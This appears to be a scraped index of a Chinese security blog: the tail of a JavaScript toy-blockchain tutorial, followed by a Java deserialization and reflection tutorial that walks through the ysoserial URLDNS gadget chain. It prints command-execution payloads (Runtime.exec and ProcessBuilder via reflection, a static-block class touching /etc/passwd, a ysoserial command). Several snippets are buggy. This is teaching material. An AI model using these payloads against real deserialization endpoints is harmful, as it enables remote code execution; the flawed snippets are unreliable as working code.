容量是有限制的，所以在挖矿时记录的转账记录会选择手续费最高的transaction\n         * 我们这里先不考虑这种情况\n         *******************************************************/\n        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)\n        newBlock.mine()\n\n        //添加到区块链，并清空Transaction Pool\n        this.chain.push(newBlock)\n        this.transactionPool = []\n    }\n```\n\n整个写好的数字代币：\n\n```jsx\nconst sha256 = require('crypto-js/sha256')\n\nclass Transaction{\n    constructor(from, to , amount) {\n        this.from = from\n        this.to = to\n        this.amount = amount\n    }\n}\nclass Block{\n    constructor(transaction,previousHash) {\n        this.transactions = transaction\n        this.time = Date.now()\n        this.nonce = 1\n        this.previousHash = previousHash\n        this.myHash = this.calcHash()\n    }\n    // 计算hash时要将data转换为字符串类型，此时的data是一个transaction\n    calcHash() {\n        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()\n    }\n    /** 获取相应难度hash **/\n    getAnswer(difficulty){\n        let answer = \"\"\n        for(let i=0; i<difficulty; i++)\n        {\n            answer += \"0\"\n        }\n        return answer\n    }\n   /** 引入挖矿功能 **/\n    mine(difficulty){\n        let answer = this.getAnswer(difficulty)\n        let Hash = this.calcHash()\n       while(true){\n            if (Hash.substring(0,difficulty) != answer)\n            {\n                this.nonce++\n                Hash = this.calcHash()\n            }else{\n                break\n            }\n       }\n       console.log(\"mine successful!\\n\")\n       console.log(\"计算\"+this.nonce+\"次后挖矿成功，answer为\"+Hash)\n       return Hash\n    }\n}\n\nclass blockChain{\n    constructor()\n    {\n        this.chain = [this.createBlockchain()]\n        this.difficulty = 4\n        this.transactionPool = []  //挖矿成功的转账信息\n        this.mineReward = 50       //每次挖矿成功的奖励货币数\n    }\n    createBlockchain()\n    {\n        return new Block(\"Genesisblock\",null)\n    }\n    getLatestBlock()\n    {\n        return this.chain[this.chain.length - 1]\n    }\n    //将Transaction添加到Transaction Pool中\n    addTransaction(Transaction)\n    {\n        this.transactionPool.push(Transaction)\n    }\n    mineTransaction(minerAddress)\n    {\n        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)\n        this.transactionPool.push(minerRewardTransaction)\n\n        //挖矿\n        /********************************************************\n         * 这里新区块记录了整个区块链的转账信息，但在实际情况中区块的存储\n         * 容量是有限制的，所以在挖矿时记录的转账记录会选择手续费最高的transaction\n         * 我们这里先不考虑这种情况\n         *******************************************************/\n        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)\n        newBlock.mine(this.difficulty)\n\n        //添加到区块链，并清空Transaction Pool\n        this.chain.push(newBlock)\n        this.transactionPool = []\n    }\n\n}\n\n/***********************************************\n验证区块链防篡改需要检测两项：\n 1.重新计算区块的hash值，判断与区块中储存的hash是否相同\n 2.判断当前区块的previousHash是否和上一区块的hash相同\n ***********************************************/\nfunction validateBlock(validBlockchain){\n    if (validBlockchain.chain.length == 1)\n    {\n        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())\n        {\n            console.log(\"数据篡改\")\n            return false\n        }\n    }else {\n        for (let i=1; i<=validBlockchain.chain.length-1; i++)\n        {\n            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())\n            {\n                console.log(\"数据篡改\")\n                return false\n            }\n            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)\n            {\n                console.log(\"前后区块链断裂\")\n                return false\n            }\n        }\n    }\n    console.log(\"数据无篡改且区块链结构完整\")\n    return true\n}\n\nY1Coin = new blockChain()\nconst Transaction1 = new Transaction('add1', 'add2', 20)\nconst Transaction2 = new Transaction('add1', 'add2', 5)\nY1Coin.addTransaction(Transaction1)\nY1Coin.addTransaction(Transaction2)\nY1Coin.mineTransaction(\"add3\")\nconsole.log(Y1Coin)\nconsole.log(Y1Coin.chain[1].transactions)\n\n```\n\n![image-20230206144032572](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206144032572.png)\n","tags":["web3.0"],"categories":["区块链"]},{"title":"Java安全反序列化预备全知","url":"/2023/04/21/Java安全反序列化预备全知/","content":"\n# Java原生序列化/反序列化\n\n# **Java反序列化入门篇**\n\n## **Java IO**\n\n在学习Java反序列化之前我们先要了解一下Java的输入输出流：\n\njava的IO流分为了**文件IO流（FileInput/OutputStream）和对象IO流（ObjectInput/OutputStream）**，从名字上就可以看出来一个是用来对文件进行输入和输出，一个是对对象进行输入和输出。\n\n流的传输过程：\n\n首先不管是输入还是输出，传输的两端都是文件和java的运行程序，所以如果想要在这二者之间进行传输，我们就需要将他们两个之间搭起来一个可以传输的通道，这样就可以实现流的传输。\n\n- 输出流（OutputStream）：\n\n如果我们想对一个文件进行写入操作，那么实质上是在java程序中将流（想要写入的内容）输出到目的文件中，所以流的方向是从java输出到文件，举个对文件写入一个对象的例子：\n\n```\nObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"filename\"));\noos.writeObject(obj);\n\n```\n\n首先用`new FileOutputStream`创建一个文件输出流，再用`new ObjectOutputStream`创建一个对象输出流（因为oos是对象输出流类型），这时我们就可以在java程序中向外（文件）输出流（内容）了，画成图大概是这样：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg)\n\n当我们要给这个文件传一个obj对象时，就会从java程序顺着这条通道进入到file中。\n\n- 输入流（InputStream）\n\n其实输入流和输出流构建出传输通道的方法几乎是一样的，区别就是流的输出方向是从file指向了java程序，所以如果想要read这个文件我们就要用输入流将file输入到java程序中进行读取。\n\n## **Java序列化和反序列化的过程**\n\n首先为什么要进行序列化和反序列化，在程序运行结束后，这个程序里的对象都会被删除，并且对象的构成很复杂，传输起来非常不方便。如果我们想要让某些对象持久的保存下来并利于传输，我们就可以将这些对象进行序列化成一串数据，保存在某个地方，在需要用到这个对象时再反序列化让这一串数据还原成一个对象。看到一个很生动的比喻，想把一张桌子搬进门里，如果不能通过，我们就可以将这个桌子拆开（序列化），在搬进去之后再将桌子组装回去（序列化），这就是序列化和反序列化。\n\n与php反序列化不同的是php序列化和反序列化提供了关键字`serialize和unserialize`，但java并没有这种api，我们刚才提到了Java的IO，那么它和Java的序列化和反序列化之间有什么关系呢，我们刚才说序列化就是将对象转换为一串字节数据并保存起来，那么这个过程的实现其实就是依靠java的输出，将这个对象从java程序里以字节数据流的形式输出到java的外部，相对的反序列化其实就是依靠java的输入，将java外的字节数据流输入到java程序中，最终经过一些处理还原为对象。也就是说java中的序列化和反序列化是需要开发人员自己写出整个过程。这里提供两段使用javaIO进行序列化和反序列化的代码（如果要完成整个序列化和反序列化的过程，还需要其他方法参与构建，如readObject和writeObject，下面会提到），假设ser.bin是我们用来储存序列化后字节数据流的文件：\n\n```\n/** 要序列化和反序列化的类 **/\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n\n    private String name;\n    private int age;\n\n    public Person(){\n\n    }\n    // 构造函数\n    public Person(String name, int age){\n        this.name = name;\n        this.age = age;\n    }\n\n    @Override\n    public String toString(){\n        return \"Person{\" +\n                \"name='\" + name + '\\\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n\n```\n\n```\n/** 序列化 **/\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutput;\nimport java.io.ObjectOutputStream;\n\npublic class SerializationTest {\n    public static void serialize(Object obj) throws IOException{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n    public static void main(String[] args) throws Exception{\n        Person person = new Person(\"aa\",22);\n        System.out.println(person);\n        serialize(person);\n    }\n}\n\n```\n\n```\n/** 反序列化 **/\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\n\npublic class UnserializeTest {\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));\n        Object obj = ois.readObject();\n        return obj;\n    }\n\n    public static void main(String[] args) throws Exception{\n        Person person = (Person)unserialize(\"ser.bin\");\n        System.out.println(person);\n    }\n}\n\n```\n\n输出后可以发现在序列化之前输出对象person和在反序列化后输出都调用了`__toString`，成功构造了序列化和反序列化。\n\n## **php和Java反序列化之间的区别**\n\n在php的序列化和反序列化中提供了serialize和unserialize函数，可以直接将对象序列化为一串数据或直接将一串数据反序列化为一个对象，程序员在这个过程中是无法参与的，但在Java中，需要程序员自己来构建序列化和反序列化的过程，php在反序列化时会自动触发`__wakeup`函数，java在反序列化时会自动触发`readObject`方法，虽然都是在反序列化时触发，但二者之间有一些细微的差别。\n\nphp反序列化（对一个数据库链接对象反序列化）：\n\n```\n<?php\nclass Connection\n{\n    protected $link;\n    private $dsn, $username, $password;\n\n    public function __construct($dsn, $username, $password)\n    {\n        $this->dsn = dsn;\n        $this->username = username;\n        $this->password = password;\n        $this->connect();\n    }\n\n    private function connect()\n    {\n        $this->link = new PDO($this->dsn, $this->username, $this->password);\n    }\n}\n\n```\n\n如果我们直接输出序列化后的这个Connection类的对象，发现输出为null，那么在反序列化时也是null，因为在php中资源类型的对象默认不会写入序列化数据中。\n\n如果我们将代码改成下面这样就可以在序列化后在`$link`中拿到一个数据库连接了：\n\n```\n<?php\nclass Connection\n{\n    protected $link;\n    private $dsn, $username, $password;\n\n    public function __construct($dsn, $username, $password)\n    {\n        $this->dsn = dsn;\n        $this->username = username;\n        $this->password = password;\n        $this->connect();\n    }\n\n    private function connect()\n    {\n        $this->link = new PDO($this->dsn, $this->username, $this->password);\n    }\n    public function __sleep()\n    {\n            return array('dsn', 'username', 'password');\n    }\n    public function __wakeup()\n    {\n        $this->connect();\n    }\n}\n\n```\n\nConnection的对象被反序列化后调用`__wakeup`，执行connect函数连接数据库，所以`__wakeup`的作用其实是反序列化后执行一些初始化操作，但在php中很少利用序列化数据传输资源类型的对象，而其他类型的对象在反序列化的时候已经把值写死了，所以php的反序列化漏洞中很少是由`__wakeup`这个方法触发的，通常触发在`__destruct`中。\n\nJava反序列化：\n\n```\nimport java.io.IOException;\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n\n    private String name;\n    private int age;\n\n    Person(String name,int age)\n    {\n        this.name = name;\n        this.age = age;\n    }\n    private void writeObject(java.io.ObjectOutputStream s) throws IOException {\n        s.defaultWriteObject();\n        s.writeObject(\"This is a Object\");\n    }\n\n    private void writeObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {\n        s.defaultReadObject();\n        String message = (String) s.readObject();\n        System.out.println(message);\n    }\n}\n\n```\n\n在`writeObject`中，当传入的对象完成了从`ObjectOutputStream`中继承来的`defaultWriteObject`后，向流内写入了一个\"This is a Object\"，因此会在序列化后触发改方法，将字符串写入输出流的对象中，用知识星球里提到的工具SerializationDumper可以看到这个字符串被写到了objectAnnotation位置，在反序列化还原对象时就会将这个字符串输出。\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png)\n\n反序列化的过程是根据开发者的想法来实现的，所以总结一下`__wakeup`和`readObject`的不同就是：`readObject`倾向于解决\"反序列化时如何还原一个完整对象\"这个问题，而PHP的`__wakeup`更倾向于解决反序列化后如何初始化这个对象的问题。\n\n# 反射+URLDNS\n\n# **Java反射篇**\n\n如果我们有一个类，那么我们可以通过实例化该类的对象并调用其中的方法，或者我们也可以直接调用该类中的静态方法，这是我们在一般情况下调用一个方法时的过程，但是在不同的语言中也有不同的方法可以拿到某一个类中的所有内容，在java中我们可以通过“反射”来拿到某一个类中的具体内容 如果把通过new对象并且调用其中的方法的过程叫做“正射”，那么不使用new来创建对象并调用其中方法的过程就叫做“反射”\n\n## **反射常用到的方法**\n\n在java的lang包中有一个静态Class类 在java程序运行并编译加载一个类时，java.lang.Class就会实例化出一个对象，这个对象储存该类的所有信息 因此我们可以通过一些方法来获取到这个类的信息 先了解一些方法\n\n- `Class.forName(classname)` 获取classname类中的所有属性包括类名 比如`Class clazz = Class.forName(\"java.lang.Runtime\");`\n\n那么类clazz中就得到了java.lang.Runtime中的所有属性\n\n- `Class.newInstance()`实例化对象，并触发该类的构造方法 下面会详细解释\n- `Class.getMethod(method name,arg)` 获取一个对象中的public方法，由于java支持方法的重载，所以需要第二参数作为获取的方法的形参列表，这样就可以确定获取的是哪一个方法\n- `Method.invoke`() 执行方法，如果是一个普通方法，则invoke的第一个参数为该方法所在的对象，如果是静态方法则第一个参数是null或者该方法所在的类 第二个参数为要执行方法的参数\n\n`forName`并不是唯一获取一个类的方式，其他方式还有：\n\n- obj.getClass() 如果上下文中存在某个类的实例obj，那我们可以直接通过obj.getClass来获取它的类\n- Y1.class 如果已经加载了一个类Y1，只是想获取到它由java.lang.class所创造的对象，那么就直接使用这种方法获取即可，这种方法并不属于反射\n- Class.Forname 如果知道某个类的名字，想获取到这个类，就可以使用forName来获取\n\n### **关于forname**\n\n默认情况下 `forName`的第一个参数是类名，第二个参数表示是否初始化，第三个参数就是ClassLoader\n\nClassLoader是一个“加载器”，告诉java虚拟机如何加载这个类，java默认的ClassLoader就是根据类名加载类，这个类名必须是完整路径，比如上面提到的java.lang.Runtime\n\n第二个参数`initialize`用于forname时的初始化，一般我们会认为初始化就是加载类的构造函数，其实并不是，这里提到的初始化有以下过程：\n\n看下面这个类：\n\n```\nclass TrainPrint{\n    {\n        System.out.printf(\"Empty block inittial &s\\\\n\", this.getClass());\n    }\n\n    static{\n        System.out.printf(\"Static initial %s\\\\n\", TrainPrint.class);\n    }\n\n    public TrainPrint(){\n        System.out.printf(\"Innitial %s\\\\n\", this.getClass());\n    }\n}\n\n```\n\n这个类中一共有三个代码块 ，在进行初始化时按照以下优先级调用代码块\n\n1. static{}\n2. {}\n3. 构造函数\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png)\n\n其中，static{}就是在“类初始化”时调用的，而{}中的代码会放在构造函数的`super()`后面，但在当前构造函数内容的前面\n\n所以`forNmae`中的`initialize=true`其实就是告诉jvm是否执行“类初始化”\n\n那么 如果有以下方法 其中的参数name可控：\n\n```\npublic void ref(String name) throws Exception {\n\t\tClass.forName(name);\n}\n\n```\n\n我们就可以编写一个恶意类，将恶意代码放置在`static{}`中，从而执行：\n\n```\nclass PayLoad{\n    static{\n        try{\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {\"touch\", \"/etc/passwd\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n\n        } catch (Exception e){\n\n        }\n    }\n}\n\n```\n\n## **如何通过反射执行命令**\n\n我们刚才提到，如果想拿到一个类，需要先import才能使用，而使用forname就不需要了，这样我们就可以利用forname加载任意类。\n\n在java中是支持内部类的，比如我们在普通类 c1中编写内部类c2，在编译时会生成两个文件：c1.class和c1$c2.class，这两个类之间可以看作没有关联，通过`Class.forname(\"c1$c2\")`即可加载这个内部类，当fastjson在`checkAutotype`时就会先讲$替换成`.` 上面说到的`$`的作用时查找内部类。\n\n当我们通过反射获取到一个类之后，可以继续通过反射来调用其中的属性和方法，也可以继续实例化这个类，调用其中的方法，也就是用`newInstance()`\n\n上面提到过newInstance会实例化类，并且触发它的构造方法，所以在一些情况下newInstance是不能成功执行的，比如\n\n```\nClass clazz = Class.forName(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.newInstance(), \"id\");\n\n```\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png)\n\n我们分析上面两行代码，首先通过反射将`java.lang.Runtime`中的所有属性和方法存到了clazz中，继续利用反射拿到clazz（Runtime）中的`exec`方法，最后使用invoke执行该方法，问题就出在乐invoke的参数上。\n\n我们上面提到了invoke执行方法，第一个参数是该方法所在的对象或者类，也就是说我们需要通过`clazz.newInstance`来实例化clazz，作为invoke的参数，但clazz的构造函数来自于Runtime，我们看一下Runtime的构造函数\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png)\n\nRuntime的构造方法为私有，所以在newInstance时才会报错。\n\n这里P神的**java安全漫谈**里说明了为什么要将构造方法设为私有，这就是很常见的“单例模式”。\n\n比如对于web应用来说，数据库只需要建立一次链接，而不是每次用到数据库都要建立一次新的连接，作为开发者就可以将数据库连接使用的构造函数设为私有，然后编写一个静态方法来获取：\n\n```\npublic class TrainDB() {\n\tprivate static TrainDB instance = new TrainDB();\n\n\tpublic static TrainDB getInstance() {\n\t\treturn instance;\n\t}\n\n\tprivate TrainDB() {\n\t// 建立连接的代码\n\t}\n}\n\n```\n\n在这个类初始化时，就会在类内部实例化出一个连接数据库的对象，我们在需要数据库连接时，只需要调用其中的`getInstance()`方法获取这个对象即可。\n\n回到如何执行命令上，如果不能通过实例化调用方法，我们就可以尝试继续通过反射来调用方法，我们将代码改成下面这样就可以了：\n\n```\nClass clazz = Class.forname(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz),\"calc.exe\");\n\n```\n\n我们在刚开始执行命令时就用到了Runtime来获取其中的`exec`方法，不难看出它和python的os类似，给我们提供了一些可以执行命令的方法，那么Runtime到底有什么作用？\n每当我们执行一个java程序时，Runtime类都会生成一个实例，来储存当前运行的java程序的相关信息，我们可以通过Runtime类中的`getRuntime()`方法来调用当前java程序的运行环境（也就是上面提到的储存相关信息的实例），这样就可以在执行系统命令时让jvm知道我们要对哪个java程序执行命令\n\n我们分析以下上面执行命令的两行代码\n\n- 通过反射获得Runtime类\n- 通过反射获得clazz(Runtime)中的`exec`方法\n- `invoke()`调用exec方法\n- 调用`getRuntime()`将当前java程序运行的环境作为参数传递给invoke，并执行命令`exec \"calc.exe\"`\n\n可以发现我们在用invoke执行Runtime中的命令时，如果不能通过`newInstance`来实例化对象作为参数，我们可以通过调用`getRuntime()`来获取当前环境，从而代替invoke的第一个参数。\n\n上面执行命令的两行代码分解开就是：\n\n```\nClass clazz = Class.forname(\"java.lang.Runtime\");\nMethod execMethod = clazz.getMethod(\"exec\", String.class);\nMethod getRuntime = clazz.getMethod(\"getRuntime\")；\nObject currentRuntime = getRuntime.invoke(clazz);\nexecMethod.invoke(currentRuntime, \"calc.exe\");\n\n```\n\n## **一些其他的反射机制**\n\n- 我们刚才说到可以通过forname拿到了一个类，并且继续利用反射或实例化调用其中的方法，如果一个类没有无参构造方法或者也没有类似单例模式里的静态方法，那我们应该怎样通过反射实例化该类呢？\n- 如果一个方法或构造方法是私有方法，我们应该怎么去执行它呢？\n\n### **利用`ProcessBuilder`执行命令**\n\n第一个问题，我们可以用一个新的反射方法`getConstructor`。\n\n和getMethod类似，`getConstructor`接收的参数是构造函数的的列表类型，因为构造函数也支持重载，所以要用参数列表类型才能唯一确定一个构造函数\n\n比如我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后 调用`start()`来执行命令\n\n**ProcessBuilder:**\n\nProcessBuilder用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，我们可以通过实例化这个类并且通过反射调用其中的start方法来开启一个子进程 ，我们可以理解成当`getRuntime`被禁用时，可以用`ProcessBuilder`来执行命令。\n\n`ProcessBuilder`有两个构造函数：\n\n- `public ProcessBuilder(List<String> command)`\n- `public ProcessBuilder(String... commang)`\n\n我们用`ProcessBuilder`写一个执行命令的payload：\n\n```\n Class clazz = Class.forName(\"java.lang.ProcessBuilder\");\n ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n```\n\n1. 首先利用反射获取`ProcessBuilder`类；\n2. 获取clazz(ProcessBuilder)形参列表为`List<String> command`的构造函数；\n3. 将获取到的构造函数利用newInstance进行实例化，调用构造函数；\n4. 对构造函数传入的参数为 `calc.exe`，并且用`Arrays.asList`方法将要执行的命令转为List类型；\n5. 返回List类型的`command`；\n   \n    ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png)\n    \n    ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png)\n    \n    1. 将List类型的command强制转换为`ProcessBuilder`类型，这样就可以调用`ProcessBuilder`中的start方法打开`calc.exe`进程。\n       \n        ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png)\n        \n    \n    可以看到这个方法需要用到强转，但有时候在利用漏洞时并没有这种语法，所以我们接着利用反射来完成这一步\n    \n    ```\n    Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\")));\n    \n    ```\n    \n    1. forName获取类；\n    2. 获取clazz中的`start`方法；\n    3. 用invoke执行start方法，这里我们之前说过用invoke执行方法时，第一个参数要是该方法所在类的对象，但clazz中没有无参构造方法，所以invoke的第一个参数不能是`clazz.newInstance`，所以这里我们换个方法，通过`getConstructor`获取到`ProcessBuilder`的构造函数，并利用这个构造函数`newInstance`，在实例化的同时对构造方法传入参数`calc.exe`，因为我们刚才提到了`ProcessBuilder`是没有无参构造函数的，所以在实例化的时候必须要传入参数。（这里获取的构造方法依然是上面提到的形参列表为List的构造函数）\n    \n    那么我们再来看`ProcessBuilder`的另一个构造方法：\n    \n    ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png)\n    \n    我们看到这个构造方法的参数列表为`String... command`，这个参数列表的意思其实就是参数数量可变列表，当我们在写一个方法时，不知道要传入多少参数，我们就可以写成`Type... Args`的方式，其实在底层来看`String... command`这样的写法就等效于`String[] command`，相当于传入了一个字符数组\n    \n    比如有一个hello方法：\n    \n    ```\n    public void hello(String...names){}\n    \n    ```\n    \n    如果我们有一个数组想传给y1方法，只需要直接传就行：\n    \n    ```\n    String[] names = {\"hello\", \"world\"};\n    hello(names)\n    \n    ```\n    \n    所以如果我们想要获取到参数列表为`String... command` 的这个构造方法，我们在`getConstructor`时要传入的参数为`String[].class`，在调用newInstance时，因为这个构造方法本身接受的就是一个可变长数组，我们在传入时也传入了一个数组，因此叠加起来是一个二维数组，所以利用这个构造方法的payload如下：\n    \n    ```\n    Class clazz = Class.forName(\"java.lang.ProcessBuilder\");\n    ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{\"calc.exe\"}})).start();\n    \n    ```\n    \n    1. 反射拿到类；\n    2. `getConstructor`拿到参数列表为`String... command`的构造方法；\n    3. `newInstance`触发该构造方法，并且传入一个二维字符数组；\n    4. 由于返回的command是字符数组类型，所以强转为`ProcessBuilder`并用`start()`方法触发；\n\n### 如何通过反射执行私有方法\n\n再回到第二个问题上，如果一个方法或构造方法是private，我们是否能执行它呢？\n\n这里就要用到`getDeclared`系列的反射了，与普通的`getMethod，getConstructor`区别是：\n\n- `getMethod`系列方法获取的是当前类中所有公共方法，包括从父类继承的方法；\n- `getDeclaredMethod`系列方法获取的是当前类中“声明”的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了\n\n在用法上`getDeclaredMethod`的具体用法与`getMethod`类似，`getDeclaredConstructor`的具体用法和`getConstructor`类似\n\n举个例子，我们之前提到过Runtime的构造方法是私有的，所以我们要通过`Runtime.getRuntime()`来获取对象，其实我们也可以直接用`getDeclaredConstructor`来获取这个私有的构造方法实例化对象，进而执行命令：\n\n```\nClass clazz = Class.forName(\"java.lang.Runtime\");\n        Constructor m =clazz.getDeclaredConstructor();\n        m.setAccessible(true);\n        clazz.getMethod(\"exec\",String.class).invoke(m.newInstance(), \"calc.exe\");\n\n```\n\n这里我们在获取到私有方法后，要用`setAccessible()`方法使这个私有方法可以被访问，其他的就和之前介绍的反射一样了，如果不用`setAccessible()`方法修改作用域这个方法是仍然不能调用的\n\n————————————————————————————————————————————\n\n## **ysoserial**\n\n在上手java反序列化的第一条链子之前，我们需要一个集成了java反序列化各种gadget chains（利用链）的工具，[ysoserial](https://github.com/frohoff/ysoserial)。\n\nysoserial下载好后还需要再安装一些其他的依赖，教程网上有很多，我就不细说了，我们先简单了解一下ysoserial中一些比较重要的东西。\n\n首先是序列化（Serialize）：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png)\n\n这个序列化操作和我之前提到的基本是一样的，将一个对象以字节流的形式输出并保存，并触发它的writeObject。\n\n反序列化（Unserialize 再ysoserial中叫Deserialize）：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png)\n\n将一个字节流读入还原为对象并触发它的readObject。\n\nPayloadrunner：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png)\n\n可以看到在Payloadrunner中，先将对象序列化再反序列化，其实就是用来运行我们的链，并生成相应的payload，具体执行命令（用cc链举例）：\n\n```\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 \"id\"\n\n```\n\n如果我们直接再intellij中运行这些链，不会出现payload，并且要注意一个问题，在java反序列化中几乎我们反序列化执行命令的结果是没有回显的，所以我们需要用一些比较明显的命令让我们知道这个链子被成功触发了，在ysoserial中我们一般用计算器`calc.exe`，一般来说ysoserial安装好后payload默认的参数是`calc.exe`，如果不是的话就要自己手动设置默认参数了，具体的我就不多说了。\n\n## **URLDNS**\n\n那么我们来上手java反序列化的第一条链子，`URLDNS`，这条链子的利用链很短，我们看一下ysoserial中的代码：\n\n```\npublic class URLDNS implements ObjectPayload<Object> {\n\n        public Object getObject(final String url) throws Exception {\n\n                //Avoid DNS resolution during payload creation\n                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.\n                URLStreamHandler handler = new SilentURLStreamHandler();\n\n                HashMap ht = new HashMap(); // HashMap that will contain the URL\n                URL u = new URL(null, url, handler); // URL to use as the Key\n                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n\n                Reflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n                return ht;\n        }\n\n        public static void main(final String[] args) throws Exception {\n                PayloadRunner.run(URLDNS.class, args);\n        }\n\n        /**\n         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.\n         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior\n         * using the serialized object.</p>\n         *\n         * <b>Potential false negative:</b>\n         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the\n         * second resolution.</p>\n         */\n        static class SilentURLStreamHandler extends URLStreamHandler {\n\n                protected URLConnection openConnection(URL u) throws IOException {\n                        return null;\n                }\n\n                protected synchronized InetAddress getHostAddress(URL u) {\n                        return null;\n                }\n        }\n}\n\n```\n\n一点点分析一下，首先从URL的创建开始：\n\n```\nURLStreamHandler handler = new SilentURLStreamHandler();\n\n                HashMap ht = new HashMap(); // HashMap that will contain the URL\n                URL u = new URL(null, url, handler); // URL to use as the Key\n                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n\n```\n\n- 先是用`URLStreamHandler`c创建了一个句柄，这个句柄可以打开一个指定的url。\n- 创建一个哈希表，并将url对象u作为key存入到了哈希表中。\n\n```\nReflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n                return ht;\n        }\n\n        public static void main(final String[] args) throws Exception {\n                PayloadRunner.run(URLDNS.class, args);\n        }\n\n```\n\n- 这里将url对象u的hashCode设置成了-1，为什么要这么做我们一会在分析具体的触发过程时会提到。\n- 返回了哈希表对象ht，并用PayloadRunner运行该利用链。\n\n这段代码就干了这些事，那么是怎么触发反序列化的呢，我们之前提到过在反序列化时会触发readObject，那么我们直接去看Hashmap的readObject方法：\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png)\n\n最重要的一行就是最后的`putValue`，里面计算了哈希表的键名。我们跟一下`putValue`方法，发现利用hash方法计算了哈希表的key。\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png)\n\n我们再继续跟进hash方法，发现这里调用了哈希表key的hashcode方法，我们回到刚才创建哈希表时，是把url对象存入到了key中，所以我们直接去找`java.net.URL`的`hashCode`方法。\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png)\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png](https://cdn.jsdelivr.net/gh